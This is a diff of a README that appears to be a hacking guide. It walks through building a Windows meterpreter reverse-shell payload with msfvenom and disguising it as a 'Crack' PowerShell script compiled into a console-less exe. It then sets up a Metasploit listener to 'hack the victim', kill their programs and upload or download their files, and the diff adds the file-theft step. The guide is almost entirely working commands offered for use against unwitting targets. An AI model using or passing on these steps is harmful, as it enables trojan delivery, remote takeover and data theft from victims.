@@ -24,21 +24,21 @@ Use it wisely. Or don’t.
 ```
  sudo nano /etc/network/interfaces
 ```
-	فالملف كتب :
+*  Write :
 ```
 # The loopback network interface
 auto lo
 iface lo inet loopback
 ```
-   *Now we go to *Resolv.conf*
+*  Now we go to *Resolv.conf*
 ```
 sudo nano /etc/resolv.conf
 ```
-Add your nameserver, exemple if ur ip is 192.168.42.50 put 
+*  Add your nameserver, exemple if ur ip is 192.168.42.50 put 
 ```
 nameserver 192.168.42.1
 ```
-⚠️*Restart your pc*
+*  ⚠️**Restart your pc**
 
 ### WIFI
 ```
@@ -53,17 +53,17 @@ iface eth0 inet static
     netmask 255.255.255.0
     gateway 192.168.1.1
 ```
-Now we go to *Resolv.conf*
+*  Now we go to **Resolv.conf**
 ```
 sudo nano /etc/resolv.conf
 ```
-Add these domains 
+*  Add these domains 
 ```
 nameserver 8.8.8.8
 nameserver 8.8.4.4
 nameserver 1.1.1.1
 ```
-⚠️*Restart your pc*
+*  ⚠️**Restart your pc**
 
 ## Download Tools
 
@@ -72,7 +72,7 @@ nameserver 1.1.1.1
 sudo apt install metasploit-framework
 ```
 **ps2exe**
-	* run PowerShell as an administrator
+*  run PowerShell as an administrator
 ```
 Find-Module -Name PowerShellGet | Install-Module 
 Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
@@ -80,9 +80,11 @@ Install-Module -Name ps2exe
 ```
 ## Command line
 
-   Here u gonne find all command u need, we started with Created Payload
+*  Here u gonne find all command u need, we started with Created Payload
 ```
 Cd Desktop
+```
+```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST={YOUR IP} LPORT={YOUR PORT 8080 or 4444 ...} -f exe -o {Name of your Payload}.exe
 ```
    **Compression of Payload**
@@ -91,19 +93,19 @@ tar -czvf {Compressed file name}.tar.gz {Name of your Payload}.exe
 ```
    **Create a Malware backdoor**
 
-   * Download my file _Crack.ps1_
-   * Edit the file to suit your Payload.
+   *  Download my file _Crack.ps1_
+  *  Edit the file to suit your Payload.
 
-   **Convert file powershell (.Ps1) to Exe
-   1. Run Powershell.
-   2. Go to the file location.
-   3. Command line (Change name *crack* to your)
+   **Convert file powershell (.Ps1) to Exe**
+   1.    Run Powershell.
+   2.    Go to the file location.
+   3.    Command line (Change name *crack* to your)
 ```
 Invoke-ps2exe .\crack.ps1 .\crack.exe -noConsole
 ```
 
 ### Metasploit
-   Now with the moment awaited to hack the victim 🗡
+  *  Now with the moment awaited to hack the victim 🗡
 ```
 msfconsole
 use exploit/multi/handler
@@ -146,8 +148,14 @@ execute -f cmd.exe -a "/c taskkill /{PROGRAM NAME}.exe /F"
 ```
 upload /home/xxxx/Desktop/YYY
 ```
-   *xxxx : name of ur folder (link)
-   *YYY  : name of file 
+  *  xxxx : name of ur folder (link)
+  *  YYY  : name of file 
+
+ **Download file from victim's pc**
+*  access the file do you want to take from it
+```
+Download FILE_NAME
+```
  
 ## Tutorial Video 
 [![3HK- Rosetta Stone](https://user-images.githubusercontent.com/47686437/168548113-b3cd4206-3281-445b-b7c6-bc0a3251293d.png)](https://www.youtube.com/)
